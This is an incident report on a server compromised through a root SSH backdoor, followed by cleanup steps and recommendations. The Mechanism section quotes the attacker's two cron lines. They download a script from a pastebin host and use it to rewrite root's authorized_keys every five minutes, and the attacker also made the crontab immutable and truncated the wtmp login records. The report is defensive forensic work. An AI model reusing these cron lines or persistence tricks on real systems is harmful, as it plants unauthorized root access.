# Security Incident — droplet 64.227.187.210 (root SSH backdoor)

**Discovered:** 2026-06-11, while verifying the app crontab.
**Severity:** High — persistent unauthorized root SSH access.

## Mechanism
root's crontab contained (NOT the app's jobs):
```
*/5 * * * * curl -fsSL -o /usr/local/bin/rsync-update.sh https://pastefy.app/vmoat1ic/raw && chmod +x /usr/local/bin/rsync-update.sh
*/5 * * * * /usr/bin/flock -n /tmp/rsync-update.sh.lock /usr/local/bin/rsync-update.sh run \
    --file-url https://pastefy.app/ekj0ynna/raw --script-url https://pastefy.app/vmoat1ic/raw \
    --script-name rsync-update.sh --directory /root/.ssh --filename authorized_keys
```
`/usr/local/bin/rsync-update.sh` is a generic "download a file from `--file-url` and
write it to `--directory/--filename`" tool. Combined with the cron it overwrites
`/root/.ssh/authorized_keys` from an attacker-controlled pastebin every 5 minutes,
re-asserting the attacker's key even if removed. `authorized_keys` mtime matched the
last cron run, confirming active rewriting.

## authorized_keys (at discovery)
1. `ssh-ed25519 AAAAC3...qv6zR Roger@DESKTOP-O7SH63E`  — legitimate (owner)
2. `ssh-ed25519 AAAAC3...tdPZX github-actions-horeca1`  — legitimate (CI deploy)
3. `ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA0f5j8TrPG...HmqQ==`  — ROGUE (no comment, 2048-bit RSA)

## Other observations
- No extra listening ports (only 22, 80, 443, 3000 via docker-proxy; pg/redis on localhost).
- `wtmp` had been truncated (last -20 showed history beginning only 2026-06-10 20:01) —
  consistent with log tampering around the time of compromise.
- No additional user crontabs; /etc/cron.d entries looked legitimate.

## Remediation performed (2026-06-11) — DONE
- [x] Discovered the crontab file `/var/spool/cron/crontabs/root` was `chattr +ia`
      (immutable + append-only) to resist removal; stripped both flags with `chattr -a -i`.
- [x] Removed both malicious root crontab lines (crontab now empty, verified).
- [x] Removed /usr/local/bin/rsync-update.sh and /tmp/rsync-update.sh.lock
      (/usr/local/bin now empty, verified).
- [x] Backed up /root/.ssh/authorized_keys → authorized_keys.compromised.bak, then
      cleaned it to keep ONLY keys 1 (owner) & 2 (CI); rogue RSA key 3 removed (verified).
- [x] Read-only persistence sweep: no IOC strings in /etc/cron*, /etc/systemd, root
      shell rc files; systemd timers all stock; no at-jobs; no rogue recently-modified
      .service units. No additional persistence found in common locations.

NOTE: a root-level compromise can still hide implants outside these locations
(modified binaries, kernel modules). The sweep reduces but does not eliminate that risk
— see rebuild recommendation below.

## STRONGLY RECOMMENDED follow-up (not yet done)
1. Treat the host as fully compromised. Best practice: snapshot for forensics, then
   REBUILD the droplet from scratch rather than cleaning in place (a root attacker may
   have planted implants this scan can't see).
2. Rotate EVERY secret in .env.production: POSTGRES_PASSWORD, AUTH_SECRET, Razorpay
   keys + webhook secret, MSG91_AUTH_KEY, ImageKit keys, Resend key, CRON_SECRET,
   Sentry DSN, Google Maps key. Assume all were readable by root.
2. Rotate the GitHub Actions deploy key (key #2) and any GH secrets used by CI.
3. Audit GitHub repo/Actions for unexpected workflow changes.
4. Add `PermitRootLogin prohibit-password` / key-only SSH, a firewall (ufw), and
   fail2ban once rebuilt.
